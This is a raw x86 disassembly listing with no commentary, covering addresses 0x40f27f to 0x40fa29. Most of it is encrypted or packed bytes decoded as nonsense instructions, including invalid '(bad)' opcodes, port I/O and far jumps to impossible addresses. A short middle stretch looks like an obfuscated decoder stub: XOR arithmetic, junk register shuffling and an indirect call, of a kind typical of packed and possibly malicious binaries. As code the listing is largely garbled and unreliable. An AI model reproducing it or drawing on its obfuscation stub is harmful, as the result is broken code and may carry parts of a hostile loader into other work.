  40f27f:	xor    al,0x41
  40f281:	inc    ecx
  40f282:	shl    edi,cl
  40f284:	and    edx,esp
  40f286:	retf   0x9167
  40f289:	pop    edi
  40f28a:	pushf  
  40f28b:	mov    BYTE PTR [edx],bh
  40f28d:	scas   eax,DWORD PTR es:[edi]
  40f28e:	sbb    ecx,esp
  40f290:	imul   esi,ebx,0xd5c189ea
  40f296:	int3   
  40f297:	or     al,0x2b
  40f299:	dec    ebx
  40f29a:	out    0x6c,eax
  40f29c:	push   ebp
  40f29d:	push   eax
  40f29e:	pushf  
  40f29f:	aam    0x83
  40f2a1:	ins    BYTE PTR es:[edi],dx
  40f2a2:	in     eax,dx
  40f2a3:	aas    
  40f2a4:	xlat   BYTE PTR ds:[ebx]
  40f2a5:	fcomp  QWORD PTR ds:0xfe2f5884
  40f2ab:	jmp    0xc263:0x1466857a
  40f2b2:	mov    bl,0x95
  40f2b4:	adc    al,0x6a
  40f2b6:	fwait
  40f2b7:	inc    esp
  40f2b8:	cs and eax,0xa606a469
  40f2be:	clc    
  40f2bf:	stc    
  40f2c0:	inc    edi
  40f2c1:	xchg   ebx,eax
  40f2c2:	xchg   ebx,eax
  40f2c3:	jecxz  0x40f322
  40f2c5:	cld    
  40f2c6:	lods   al,BYTE PTR ds:[esi]
  40f2c7:	lods   al,BYTE PTR ds:[esi]
  40f2c8:	cmp    cl,al
  40f2ca:	fistp  QWORD PTR [eax+0x51]
  40f2cd:	or     eax,0x9ce9caa7
  40f2d2:	cmp    DWORD PTR [edi+0x13],ebx
  40f2d5:	sub    esi,DWORD PTR [eax]
  40f2d7:	jg     0x40f30b
  40f2d9:	imul   edi,DWORD PTR [ecx+0x68047a39],0x4aa6f4d7
  40f2e3:	cmp    ah,BYTE PTR [edx-0x4f]
  40f2e6:	or     BYTE PTR [eax],0x74
  40f2e9:	jmp    0x40f26f
  40f2eb:	fild   DWORD PTR [esi]
  40f2ed:	or     DWORD PTR [ebx-0x4],ecx
  40f2f0:	xchg   eax,esi
  40f2f2:	and    DWORD PTR [ebx],ebx
  40f2f4:	jmp    0xf1d243f7
  40f2f9:	or     eax,0xc820c825
  40f2fe:	ins    BYTE PTR es:[edi],dx
  40f2ff:	repz fsub DWORD PTR [ecx-0x66]
  40f303:	jnp    0x40f30e
  40f305:	dec    ebp
  40f306:	xchg   edi,eax
  40f307:	in     al,0x2c
  40f309:	pop    esp
  40f30a:	mov    esp,0xb74632cb
  40f30f:	add    dl,ch
  40f311:	adc    al,ch
  40f313:	push   ecx
  40f314:	cdq    
  40f315:	xor    BYTE PTR [ebp-0x6],0xe2
  40f319:	fcom   st(2)
  40f31b:	dec    edx
  40f31c:	inc    ecx
  40f31d:	jg     0x40f2cc
  40f31f:	int3   
  40f320:	lea    esp,[ebx+0xc]
  40f323:	or     BYTE PTR [ebp-0x6aea1041],al
  40f329:	and    al,0xd2
  40f32b:	adc    BYTE PTR [edx+eax*4+0x7137001c],cl
  40f332:	stc    
  40f333:	jo     0x40f2d8
  40f335:	aam    0x48
  40f337:	lahf   
  40f338:	pop    edi
  40f339:	lahf   
  40f33a:	in     eax,0xf1
  40f33c:	int3   
  40f33d:	retf   
  40f33e:	xchg   BYTE PTR [edi+0x31890ef3],dl
  40f344:	std    
  40f345:	mov    al,ds:0x4ff7ded3
  40f34a:	retf   0xae9f
  40f34d:	mov    cl,0x11
  40f34f:	adc    ebp,eax
  40f351:	test   al,0xd8
  40f353:	pushf  
  40f354:	sub    edi,edi
  40f356:	push   eax
  40f357:	mov    esi,DWORD PTR [edi+eax*1+0x3d]
  40f35b:	fs mov edi,0x22956572
  40f361:	lods   eax,DWORD PTR ds:[esi]
  40f362:	rcr    BYTE PTR [edi-0x36],1
  40f365:	and    esi,DWORD PTR [esi-0x51]
  40f368:	inc    edx
  40f369:	add    al,0xf2
  40f36b:	call   0x109561ca
  40f370:	ins    DWORD PTR es:[edi],dx
  40f371:	pop    ds
  40f372:	or     esi,DWORD PTR [ecx+0x7318a770]
  40f378:	outs   dx,BYTE PTR ds:[esi]
  40f379:	mov    eax,ds:0xc8f48c68
  40f37e:	inc    ebx
  40f37f:	mov    ds:0x207467fb,eax
  40f384:	loopne 0x40f36a
  40f386:	data16 js 0x40f3ca
  40f389:	clc    
  40f38a:	mov    eax,0xb494bed2
  40f38f:	rdrand esi
  40f392:	jp     0x40f3fd
  40f394:	mov    ah,BYTE PTR [esi]
  40f396:	je     0x40f336
  40f398:	es xchg edx,eax
  40f39a:	pop    edi
  40f39b:	inc    DWORD PTR [esi-0x3fe592c7]
  40f3a1:	xor    DWORD PTR [edx-0x9],ebx
  40f3a4:	loopne 0x40f403
  40f3a6:	idiv   ah
  40f3a8:	cmp    ch,BYTE PTR [ebx+0x535d2582]
  40f3ae:	bound  eax,QWORD PTR [ecx+0x6795ca56]
  40f3b4:	sbb    dh,BYTE PTR [ecx-0x2e]
  40f3b7:	into   
  40f3b8:	sbb    al,0x8f
  40f3ba:	into   
  40f3bb:	and    ch,BYTE PTR fs:[ebp-0x2c38fd55]
  40f3c2:	push   ecx
  40f3c3:	mov    ?,WORD PTR [ecx+0x5bd63bbe]
  40f3c9:	xchg   ecx,eax
  40f3ca:	mov    al,ds:0x6064b8e4
  40f3cf:	sbb    cl,BYTE PTR [esi-0x1b]
  40f3d2:	sub    ah,bh
  40f3d4:	sti    
  40f3d5:	xchg   ebp,eax
  40f3d6:	and    bh,BYTE PTR [eax+0x3c9805d7]
  40f3dc:	jne    0x40f40b
  40f3de:	xor    eax,0x810f7581
  40f3e3:	inc    ebx
  40f3e4:	adc    esp,0xffffffff
  40f3e7:	std    
  40f3e8:	div    edi
  40f3ea:	data16 mov bh,dl
  40f3ed:	cmc    
  40f3ee:	addr16 cdq 
  40f3f0:	idiv   BYTE PTR ds:0xa25ac03
  40f3f6:	(bad)  
  40f3f8:	ins    BYTE PTR es:[edi],dx
  40f3f9:	or     ecx,eax
  40f3fb:	loope  0x40f3b8
  40f3fd:	cwde   
  40f3fe:	add    al,0x42
  40f400:	scas   al,BYTE PTR es:[edi]
  40f401:	shr    al,cl
  40f403:	pop    edi
  40f404:	sub    eax,DWORD PTR [edi+esi*2-0x134110cc]
  40f40b:	aam    0x7f
  40f40d:	mov    bl,0xd8
  40f40f:	xor    esi,edx
  40f411:	fld    TBYTE PTR [eax]
  40f413:	not    BYTE PTR [eax]
  40f415:	dec    ebp
  40f416:	push   edi
  40f417:	test   DWORD PTR [edx+0x5fd816ea],ebp
  40f41d:	int    0x8f
  40f41f:	dec    ecx
  40f420:	xor    esi,esi
  40f422:	shl    BYTE PTR [esi-0x65cf6769],cl
  40f428:	pop    esp
  40f429:	and    eax,0xef5ad40f
  40f42e:	mov    bh,0xbe
  40f430:	mov    esp,0x268e6384
  40f435:	xchg   BYTE PTR [ecx+0x5dc6f31b],bl
  40f43b:	arpl   WORD PTR [edx+0x53],cx
  40f43e:	and    eax,0x1117eb0e
  40f443:	jl     0x40f46c
  40f445:	in     eax,dx
  40f446:	mul    BYTE PTR [edi+0x42]
  40f449:	fild   QWORD PTR [esi]
  40f44b:	and    eax,0x8a8fd012
  40f450:	inc    esi
  40f451:	les    esp,FWORD PTR [edx+0x4c9a9d79]
  40f457:	mov    ch,BYTE PTR [eax-0x317f12e0]
  40f45d:	pusha  
  40f45e:	daa    
  40f45f:	dec    eax
  40f460:	push   esp
  40f461:	adc    BYTE PTR [esi],ah
  40f463:	sub    DWORD PTR [edx+0x1d],esp
  40f466:	jo     0x40f409
  40f468:	mov    edi,0x56c2a3be
  40f46d:	cmp    DWORD PTR [ebx],eax
  40f46f:	enter  0xd160,0xbd
  40f473:	adc    eax,0xcaaa07f4
  40f478:	ins    BYTE PTR es:[edi],dx
  40f479:	ja     0x40f4e6
  40f47b:	clc    
  40f47c:	dec    eax
  40f47d:	mov    eax,ds:0xa8e1688c
  40f482:	xchg   edx,eax
  40f483:	ins    DWORD PTR es:[edi],dx
  40f484:	outs   dx,DWORD PTR ds:[esi]
  40f485:	mov    al,ds:0x8c8f4941
  40f48a:	dec    edx
  40f48b:	out    0xde,al
  40f48d:	std    
  40f48e:	sbb    DWORD PTR [ecx+0x7d985dff],ecx
  40f494:	jle    0x40f4f2
  40f496:	mov    bh,0x6b
  40f498:	and    DWORD PTR [esi-0x598de0cd],0xffffffa2
  40f49f:	arpl   WORD PTR [esp+ecx*4+0x54d53d53],cx
  40f4a6:	test   DWORD PTR ds:0x2983d3be,ebx
  40f4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4ad:	popf   
  40f4ae:	mov    esi,DWORD PTR [eax-0x54422184]
  40f4b4:	(bad)  
  40f4b5:	repz push eax
  40f4b7:	jno    0x40f445
  40f4b9:	pop    ds
  40f4ba:	js     0x40f502
  40f4bc:	xor    ebx,DWORD PTR [edx-0x3a63b14]
  40f4c2:	sbb    al,0xf9
  40f4c4:	pop    edi
  40f4c5:	je     0x40f49a
  40f4c7:	test   al,0x3b
  40f4c9:	aaa    
  40f4ca:	bound  eax,QWORD PTR [edi+ebx*2+0xc997d5d]
  40f4d1:	fdivr  DWORD PTR [edx+0x3]
  40f4d4:	ja     0x40f4f0
  40f4d6:	arpl   WORD PTR ds:0xf8749106,bx
  40f4dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4dd:	or     al,bh
  40f4df:	pop    ebp
  40f4e0:	mov    ebx,0x59a5ab36
  40f4e5:	daa    
  40f4e6:	inc    esp
  40f4e7:	out    dx,eax
  40f4e8:	mov    ds:0xeb67ebb2,eax
  40f4ed:	fnstcw WORD PTR [eax+0xa]
  40f4f0:	pop    esi
  40f4f1:	add    BYTE PTR [ebp+0x102dd6b1],0x15
  40f4f8:	cwde   
  40f4f9:	cmp    ebp,DWORD PTR [edi+ebp*1-0x30]
  40f4fd:	or     eax,0x565dbd29
  40f502:	inc    esp
  40f503:	mov    ebx,0xcbf0e405
  40f508:	dec    esi
  40f509:	ja     0x40f4ed
  40f50b:	out    dx,al
  40f50c:	xchg   edx,eax
  40f50d:	mov    ecx,0x821cb436
  40f512:	std    
  40f513:	sub    DWORD PTR gs:[edi-0x16],ebp
  40f517:	adc    edx,ebp
  40f519:	in     al,0xcc
  40f51b:	pusha  
  40f51c:	pushf  
  40f51d:	add    bl,ch
  40f51f:	bswap  edi
  40f521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f522:	adc    eax,0xe749fcb8
  40f527:	pop    ss
  40f528:	xchg   eax,esp
  40f52a:	aad    0xa3
  40f52c:	imul   ebp,DWORD PTR [ecx-0x4f618969],0xf359d7e1
  40f536:	sub    DWORD PTR [edi],esi
  40f538:	(bad)  
  40f539:	mov    DWORD PTR [eax+edx*2],0xd8bd9e92
  40f540:	fwait
  40f541:	push   es
  40f542:	pop    edx
  40f543:	fsubrp st(4),st
  40f545:	pop    esp
  40f546:	jae    0x40f522
  40f548:	in     al,dx
  40f549:	adc    eax,0x69c10fe5
  40f54e:	sbb    dh,BYTE PTR [eax]
  40f550:	jae    0x40f51c
  40f552:	pop    esi
  40f553:	adc    DWORD PTR [edi],0x58351bc7
  40f559:	scas   eax,DWORD PTR es:[edi]
  40f55a:	add    cl,BYTE PTR [edi-0x4a]
  40f55d:	lods   eax,DWORD PTR ds:[esi]
  40f55e:	pop    edx
  40f55f:	jmp    0x7cfa67bf
  40f564:	xchg   edx,eax
  40f565:	mov    WORD PTR [ebp-0x4995edee],ss
  40f56b:	add    al,0xa7
  40f56d:	ja     0x40f5d7
  40f56f:	std    
  40f570:	bound  edi,QWORD PTR [ebp+0x5cf06aab]
  40f576:	push   cs
  40f577:	xlat   BYTE PTR ds:[ebx]
  40f578:	jo     0x40f551
  40f57a:	scas   al,BYTE PTR es:[edi]
  40f57b:	fcom   DWORD PTR [ebx+0x2d]
  40f57e:	and    dl,BYTE PTR [ebp-0x50]
  40f581:	lods   eax,DWORD PTR ds:[esi]
  40f582:	and    BYTE PTR [ecx+0x24051c6d],dh
  40f588:	mov    al,ds:0x44b33b99
  40f58d:	into   
  40f58e:	sbb    DWORD PTR [eax+0x6c],0xfffffff5
  40f592:	xchg   edi,eax
  40f593:	mov    dh,0xab
  40f595:	repnz pop edx
  40f597:	fdivr  QWORD PTR [ecx+eiz*4+0x41]
  40f59b:	xlat   BYTE PTR ds:[ebx]
  40f59c:	clc    
  40f59d:	xchg   BYTE PTR [ebx+0x4196a038],al
  40f5a3:	mov    dh,bl
  40f5a5:	aaa    
  40f5a6:	and    edx,eax
  40f5a8:	inc    eax
  40f5a9:	xchg   edx,eax
  40f5aa:	ficom  WORD PTR [edi]
  40f5ac:	jmp    0xc9727052
  40f5b1:	mov    DWORD PTR [ecx+0x1f36bbd7],0x1fcae4de
  40f5bb:	adc    BYTE PTR [ebx],cl
  40f5bd:	add    dh,al
  40f5bf:	inc    eax
  40f5c0:	(bad)  
  40f5c1:	iret   
  40f5c2:	shr    DWORD PTR ds:0xce331806,0x8d
  40f5c9:	test   BYTE PTR [ecx],al
  40f5cb:	icebp  
  40f5cc:	jb     0x40f600
  40f5ce:	add    BYTE PTR [ebx+0x558b084d],cl
  40f5d4:	loopne 0x40f55f
  40f5d6:	add    al,0x8a
  40f5d8:	mov    eax,DWORD PTR [ebp-0xc]
  40f5db:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5de:	xor    eax,esi
  40f5e0:	lea    eax,[eax+ecx*1+0x3272f1]
  40f5e7:	mov    DWORD PTR [ebp+0x8],eax
  40f5ea:	mov    eax,DWORD PTR [ebp-0xc]
  40f5ed:	mov    ecx,DWORD PTR [ebp+0x14]
  40f5f0:	xor    eax,esi
  40f5f2:	add    eax,edi
  40f5f4:	imul   eax,DWORD PTR [ecx]
  40f5f7:	mov    ecx,DWORD PTR [ebp-0x4]
  40f5fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f5fd:	xor    ecx,esi
  40f5ff:	lea    ecx,[ecx+edx*1+0x3272f1]
  40f606:	cmp    ecx,eax
  40f608:	jne    0x40d220
  40f60e:	mov    eax,DWORD PTR [ebp-0x4]
  40f611:	xor    eax,esi
  40f613:	add    eax,edi
  40f615:	mov    DWORD PTR [ebp-0x10],eax
  40f618:	mov    ebx,0x65655
  40f61d:	add    ebx,0x3234
  40f623:	xchg   ebx,esi
  40f625:	xor    ebx,ebx
  40f627:	push   esi
  40f628:	mov    esi,ebx
  40f62a:	pop    ebx
  40f62b:	mov    edx,esi
  40f62d:	add    ebx,0x1002
  40f633:	lea    eax,[ebp-0x18]
  40f636:	add    edx,eax
  40f638:	add    edx,0x5
  40f63b:	push   edx
  40f63c:	inc    esi
  40f63d:	pop    ecx
  40f63e:	dec    ecx
  40f63f:	xchg   ecx,eax
  40f640:	dec    eax
  40f641:	xchg   ecx,eax
  40f642:	dec    ecx
  40f643:	xchg   ecx,edx
  40f645:	dec    edx
  40f646:	push   edx
  40f647:	mov    edx,ebx
  40f649:	pop    ebx
  40f64a:	dec    ebx
  40f64b:	call   DWORD PTR [ebx]
  40f64d:	cmp    DWORD PTR [ebp+0x10],esi
  40f650:	je     0x413d8d
  40f656:	xchg   edx,eax
  40f657:	push   0xc
  40f659:	pop    ecx
  40f65a:	dec    ecx
  40f65b:	jmp    0x4119e9
  40f660:	test   al,0x3a
  40f662:	jl     0x40f606
  40f664:	out    dx,al
  40f665:	mov    ds:0xdb3d32a2,al
  40f66a:	sti    
  40f66b:	loopne 0x40f676
  40f66d:	pop    ebp
  40f66e:	out    0x18,eax
  40f670:	jp     0x40f621
  40f672:	add    DWORD PTR [ebx-0x7c7ca1f4],0x54
  40f679:	test   eax,0x56e46ccc
  40f67e:	dec    ecx
  40f67f:	inc    edx
  40f680:	pop    edx
  40f681:	imul   edi,DWORD PTR [ebx-0x62cb31bf],0x5391b91e
  40f68b:	nop
  40f68c:	push   DWORD PTR [ecx+0x2d7c419b]
  40f692:	icebp  
  40f693:	out    0x59,al
  40f695:	mov    cl,0xa7
  40f697:	add    al,0xca
  40f699:	cdq    
  40f69a:	mov    dl,0xc1
  40f69c:	push   es
  40f69d:	dec    esp
  40f69e:	ja     0x40f6b4
  40f6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6a1:	pushf  
  40f6a2:	mov    al,0xed
  40f6a4:	adc    DWORD PTR [edx+0xef84cf4],0x87402221
  40f6ae:	adc    eax,0xe528cde0
  40f6b3:	neg    ecx
  40f6b5:	retf   
  40f6b6:	mov    al,ds:0xe5e0d110
  40f6bb:	les    ecx,FWORD PTR [esi-0x1ce12cae]
  40f6c1:	rcr    DWORD PTR [edx+ebp*8-0x18767cde],0x8c
  40f6c9:	pop    ecx
  40f6ca:	(bad)  [esi]
  40f6cc:	(bad)  
  40f6cd:	or     al,0x3d
  40f6cf:	mov    eax,ds:0x798be3ae
  40f6d4:	call   0xb3190d55
  40f6d9:	sub    ebp,0x204d7f3d
  40f6df:	adc    DWORD PTR [edi-0x2f3b6b48],edx
  40f6e5:	mov    fs,edi
  40f6e7:	ret    0xc85
  40f6ea:	fld    DWORD PTR [esp+eax*8]
  40f6ed:	js     0x40f75d
  40f6ef:	or     BYTE PTR [eax-0x66da0146],bl
  40f6f5:	sub    ebp,DWORD PTR [ebp+0x15]
  40f6f8:	fxtract 
  40f6fa:	fs push cs
  40f6fc:	sbb    BYTE PTR [edi],bl
  40f6fe:	cli    
  40f6ff:	test   al,0xf7
  40f701:	aaa    
  40f702:	cmp    DWORD PTR [eax],ecx
  40f704:	or     al,BYTE PTR ds:0xaf1c17e7
  40f70a:	sub    bh,BYTE PTR [esi+0x2f9d8d13]
  40f710:	test   al,0xed
  40f712:	lods   eax,DWORD PTR ds:[esi]
  40f713:	mov    esp,0x47e2a876
  40f718:	pop    ss
  40f719:	test   ecx,ebp
  40f71b:	mov    gs:0x5ec5a75c,eax
  40f721:	loopne 0x40f6e8
  40f723:	xchg   edx,eax
  40f724:	jne    0x40f6e8
  40f726:	mov    edi,0x13847faa
  40f72b:	pop    edx
  40f72c:	imul   esi,DWORD PTR [ebx+0x5d],0xfd949e6e
  40f733:	rcl    DWORD PTR [ebx-0x1a],cl
  40f736:	out    dx,eax
  40f737:	(bad)  
  40f738:	or     eax,0x7c4801b9
  40f73d:	enter  0x5fd9,0xc8
  40f741:	sbb    cl,BYTE PTR [ecx]
  40f743:	(bad)  
  40f744:	sbb    ecx,ebp
  40f746:	int    0x11
  40f748:	add    al,0x16
  40f74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f74b:	and    eax,0xac069c3c
  40f750:	shl    BYTE PTR [ebx+edi*2],1
  40f753:	adc    eax,0x45f1c5e9
  40f758:	int    0xd5
  40f75a:	gs cmp eax,0x4babb5db
  40f760:	test   DWORD PTR [ecx+ebx*1-0x4169449],eax
  40f767:	add    BYTE PTR ds:0x6623059b,bl
  40f76d:	inc    ebp
  40f76e:	push   0x3a
  40f770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f771:	jecxz  0x40f726
  40f773:	lock sahf 
  40f775:	test   esi,ecx
  40f777:	mov    ebp,0xfd5b8c71
  40f77c:	pop    edx
  40f77d:	mov    ah,0xec
  40f77f:	(bad)  
  40f780:	xchg   ecx,eax
  40f781:	add    bl,BYTE PTR [ecx+0x5bcf68c]
  40f787:	enter  0x5d09,0x54
  40f78b:	adc    edx,DWORD PTR [eax]
  40f78d:	and    DWORD PTR [edx],edi
  40f78f:	in     al,dx
  40f790:	push   eax
  40f791:	mov    al,ds:0x3726c652
  40f796:	fninit 
  40f798:	xor    al,0xd3
  40f79a:	jno    0x40f761
  40f79c:	clc    
  40f79d:	dec    ebx
  40f79e:	inc    esp
  40f79f:	push   esi
  40f7a0:	adc    eax,0xa3b244eb
  40f7a5:	aad    0x7a
  40f7a7:	sub    dh,BYTE PTR [eax+0x5d71195d]
  40f7ad:	jmp    0x3401fb73
  40f7b2:	dec    eax
  40f7b3:	mov    ds:0x12902c5d,eax
  40f7b8:	cmp    eax,0x5ce3c7a3
  40f7bd:	add    eax,0x1ad189e1
  40f7c2:	mov    dh,0x25
  40f7c4:	popf   
  40f7c5:	sbb    al,0x82
  40f7c7:	ret    0xcf16
  40f7ca:	mov    edx,0x97b1fd2d
  40f7cf:	xor    edx,DWORD PTR [esi+0x4a54faa2]
  40f7d5:	fwait
  40f7d6:	cs push 0x51
  40f7d9:	push   0x9788954b
  40f7de:	ss cdq 
  40f7e0:	(bad)  
  40f7e1:	fld    TBYTE PTR [esi+0x4e910ede]
  40f7e7:	(bad)  
  40f7e8:	lods   al,BYTE PTR ds:[esi]
  40f7e9:	daa    
  40f7ea:	test   eax,0x71f01fd8
  40f7ef:	imul   esi,edx,0x781ea1f
  40f7f5:	cmp    DWORD PTR [edi+0x52f3ec74],edx
  40f7fb:	je     0x40f798
  40f7fd:	push   ebp
  40f7fe:	inc    ecx
  40f7ff:	sub    edi,ebp
  40f801:	jbe    0x40f877
  40f803:	and    BYTE PTR [eax+0xb],dl
  40f806:	lods   eax,DWORD PTR ds:[esi]
  40f807:	inc    ebx
  40f808:	jle    0x40f834
  40f80a:	jmp    0xb7dd5f71
  40f80f:	fdivr  st,st(4)
  40f811:	mov    bl,0xe3
  40f813:	pop    edx
  40f814:	repz test al,0x7
  40f817:	inc    edx
  40f818:	mov    DWORD PTR [ecx+0x18],0xee20bb5c
  40f81f:	in     eax,0x35
  40f821:	mov    esp,0xfbe75eb2
  40f826:	loopne 0x40f82a
  40f828:	mov    ebx,0xc08752bd
  40f82d:	test   BYTE PTR [edx-0x38],0xf8
  40f831:	inc    eax
  40f832:	sbb    al,0xb3
  40f834:	lahf   
  40f835:	xor    esi,0x79
  40f838:	xor    BYTE PTR [ebx+0x65],ch
  40f83b:	icebp  
  40f83c:	xor    BYTE PTR ds:0x2e5b119,cl
  40f842:	hlt    
  40f843:	xchg   edi,eax
  40f844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f845:	out    0x45,eax
  40f847:	fcom   DWORD PTR [edi+edx*1]
  40f84a:	xchg   DWORD PTR [ebp-0x7f772267],edi
  40f850:	push   ebx
  40f851:	into   
  40f852:	imul   eax,edx,0x49
  40f855:	inc    eax
  40f856:	scas   al,BYTE PTR es:[edi]
  40f857:	xchg   esi,eax
  40f858:	and    al,0xde
  40f85a:	aaa    
  40f85b:	mov    bl,0xab
  40f85d:	neg    DWORD PTR [esi+0x5849eff8]
  40f863:	jmp    0x40f7ea
  40f865:	jecxz  0x40f7e7
  40f867:	pop    ds
  40f868:	loopne 0x40f84d
  40f86a:	aad    0x2c
  40f86c:	jecxz  0x40f8a5
  40f86e:	sub    al,0x1c
  40f870:	in     eax,0xfe
  40f872:	or     edi,ebp
  40f874:	shl    BYTE PTR [edx+0x68],1
  40f877:	push   ebp
  40f878:	inc    ebx
  40f879:	gs mov bl,0x0
  40f87c:	neg    DWORD PTR [esi]
  40f87e:	mov    DWORD PTR [ebx-0x7b],ebp
  40f881:	retf   0x1091
  40f884:	scas   al,BYTE PTR es:[edi]
  40f885:	sbb    al,0x7a
  40f887:	dec    ebx
  40f888:	(bad)  
  40f889:	jmp    0x9d85:0xccd0d4b
  40f890:	stos   BYTE PTR es:[edi],al
  40f891:	aaa    
  40f892:	sbb    DWORD PTR [edx+0x1e],eax
  40f895:	push   ss
  40f896:	gs addr16 rol cl,0xc8
  40f89b:	dec    edx
  40f89c:	sti    
  40f89d:	pop    ebp
  40f89e:	mov    ?,WORD PTR [edi+0x792a2a22]
  40f8a4:	push   eax
  40f8a5:	dec    ecx
  40f8a6:	pop    ecx
  40f8a7:	test   eax,0xec13c5de
  40f8ac:	mov    cl,dh
  40f8ae:	jl     0x40f895
  40f8b0:	cmp    BYTE PTR [ebx+0x37206891],0x7a
  40f8b7:	jno    0x40f902
  40f8b9:	xchg   ecx,eax
  40f8ba:	(bad)  
  40f8bb:	adc    BYTE PTR [ebp+edx*8+0x2d],bl
  40f8bf:	ins    BYTE PTR es:[edi],dx
  40f8c0:	imul   ecx,DWORD PTR [ecx+0x2f],0xee4ef626
  40f8c7:	pop    ds
  40f8c8:	or     al,0xf6
  40f8ca:	ss inc esp
  40f8cc:	aaa    
  40f8cd:	ficomp DWORD PTR [ebx-0x13]
  40f8d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d1:	imul   esi,DWORD PTR [ecx+0x7938dbd3],0x6a48ffa4
  40f8db:	jnp    0x40f872
  40f8dd:	dec    esi
  40f8de:	mov    WORD PTR [ebx],?
  40f8e0:	stos   BYTE PTR es:[edi],al
  40f8e1:	out    dx,eax
  40f8e2:	test   BYTE PTR [ecx+0x4],0x82
  40f8e6:	jno    0x40f875
  40f8e8:	dec    ecx
  40f8e9:	(bad)  
  40f8ea:	out    0xee,eax
  40f8ec:	sub    edi,ebp
  40f8ee:	jmp    DWORD PTR [ebx+edi*2-0x5a]
  40f8f2:	repz and edx,eax
  40f8f5:	xchg   ebx,eax
  40f8f6:	call   0x65e0f5f2
  40f8fb:	mov    bl,0x10
  40f8fd:	push   0x6d
  40f8ff:	jb     0x40f95e
  40f901:	adc    bl,BYTE PTR [ecx+edi*4+0x14724a3a]
  40f908:	test   DWORD PTR [eax-0x39d44d16],eax
  40f90e:	mov    cl,0xb
  40f910:	fpatan 
  40f912:	out    dx,eax
  40f913:	cmp    al,0xd0
  40f915:	mov    eax,0xf15d5ee
  40f91a:	push   ss
  40f91b:	jns    0x40f954
  40f91d:	leave  
  40f91e:	add    DWORD PTR [esi],ebp
  40f920:	pop    ebp
  40f921:	fild   DWORD PTR [ebx]
  40f923:	loop   0x40f913
  40f925:	js     0x40f8ab
  40f927:	sub    ecx,DWORD PTR [esi+0x2dd4f524]
  40f92d:	comiss xmm7,DWORD PTR [ebp-0x60bd5770]
  40f934:	rcr    DWORD PTR [ecx-0x7c],0x72
  40f938:	pusha  
  40f939:	fistp  DWORD PTR [esi+0x64896429]
  40f93f:	push   eax
  40f940:	inc    edx
  40f941:	or     ecx,edi
  40f943:	add    eax,0x8ab09640
  40f948:	pop    ds
  40f949:	jmp    DWORD PTR [edi]
  40f94b:	adc    al,0xed
  40f94d:	into   
  40f94e:	inc    esi
  40f94f:	xchg   edi,eax
  40f950:	pop    ebp
  40f951:	sbb    ah,BYTE PTR [eax+ecx*2+0x273a5a31]
  40f958:	(bad)  
  40f959:	std    
  40f95a:	iret   
  40f95b:	dec    ebx
  40f95c:	fsubr  DWORD PTR [edx-0x7f]
  40f95f:	sbb    eax,0xd459cc10
  40f964:	fwait
  40f965:	imul   ebx,DWORD PTR [eax+0x6e],0x12
  40f969:	pop    edx
  40f96a:	lea    esp,[esi+0xc9fbabd]
  40f970:	add    BYTE PTR [eax+0x2a],ah
  40f973:	das    
  40f974:	paddsw mm1,mm4
  40f977:	fwait
  40f978:	scas   al,BYTE PTR es:[edi]
  40f979:	test   al,0xc2
  40f97b:	or     al,0x88
  40f97d:	sbb    bl,0x32
  40f980:	xchg   BYTE PTR [ebx-0x7514ed08],dl
  40f986:	out    0xf4,al
  40f988:	jbe    0x40f968
  40f98a:	imul   esi,DWORD PTR [edx-0x3],0xffffffdb
  40f98e:	and    DWORD PTR ds:0xb22465c0,esi
  40f994:	sub    al,0x42
  40f996:	popf   
  40f997:	out    dx,eax
  40f998:	xor    eax,0xc09bb494
  40f99d:	mov    edx,0x51aa8c72
  40f9a2:	je     0x40f9e0
  40f9a4:	dec    esp
  40f9a5:	inc    edx
  40f9a6:	dec    ebx
  40f9a7:	or     eax,0x5d3bcb8
  40f9ac:	push   ds
  40f9ad:	jg     0x40f948
  40f9af:	push   ebx
  40f9b0:	xchg   edi,eax
  40f9b1:	ds fsubr st,st(3)
  40f9b4:	dec    ecx
  40f9b5:	stc    
  40f9b6:	mov    dh,0x93
  40f9b8:	retf   0xcd25
  40f9bb:	jg     0x40f96d
  40f9bd:	mov    ebp,es
  40f9bf:	lods   eax,DWORD PTR ds:[esi]
  40f9c0:	iret   
  40f9c1:	jnp    0x40fa12
  40f9c3:	jns    0x40f9a3
  40f9c5:	dec    esp
  40f9c6:	leave  
  40f9c7:	pop    ecx
  40f9c8:	out    0xf0,al
  40f9ca:	imul   edx,DWORD PTR [ebp-0x35f44601],0x7a
  40f9d1:	xchg   esi,eax
  40f9d2:	jp     0x40f9cc
  40f9d4:	stos   BYTE PTR es:[edi],al
  40f9d5:	fild   QWORD PTR gs:[esp+eiz*4-0x4c]
  40f9da:	mov    ah,BYTE PTR [eax-0x6d90d8a3]
  40f9e0:	cmp    cl,ch
  40f9e2:	jns    0x40f9a7
  40f9e4:	scas   al,BYTE PTR es:[edi]
  40f9e5:	fsubr  QWORD PTR [ebx+0x5d835de]
  40f9eb:	inc    esp
  40f9ec:	cmp    ebx,DWORD PTR [ebp+0x7]
  40f9ef:	adc    bh,ch
  40f9f1:	cs xor bh,bl
  40f9f4:	cwde   
  40f9f5:	test   DWORD PTR [edx+0x4f],ebp
  40f9f8:	jb     0x40fa4b
  40f9fa:	int3   
  40f9fb:	stos   DWORD PTR es:[edi],eax
  40f9fc:	pop    ss
  40f9fd:	ss cmp al,0x76
  40fa00:	retf   
  40fa01:	mov    ah,0x4a
  40fa03:	into   
  40fa04:	sbb    eax,0xc4f12e61
  40fa09:	and    al,BYTE PTR [edi+0x56f9b23c]
  40fa0f:	mov    ds:0x5a2477c0,eax
  40fa14:	add    al,0x6d
  40fa16:	inc    esi
  40fa17:	pop    ecx
  40fa18:	call   0xd071:0x557ecf2a
  40fa1f:	push   esp
  40fa20:	mov    edx,0xbac5af85
  40fa25:	xor    ebp,DWORD PTR [ecx]
  40fa27:	mov    al,0xb7
  40fa29:	xchg   esp,eax
